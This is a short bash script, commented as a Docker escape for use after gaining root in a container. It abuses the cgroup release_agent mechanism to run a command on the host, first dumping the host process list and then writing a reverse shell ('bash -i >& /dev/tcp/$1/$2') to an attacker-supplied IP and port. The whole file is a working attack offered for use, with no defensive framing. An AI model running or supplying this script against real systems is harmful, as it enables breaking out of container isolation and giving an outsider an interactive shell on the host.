#!/bin/bash

#script for docker-ecape
#if got the root in container


mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd

#Reverse shell
echo '#!/bin/bash' > /cmd

#change IP and Port
echo "bash -i >& /dev/tcp/$1/$2 0>&1" >> /cmd
chmod a+x /cmd


sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
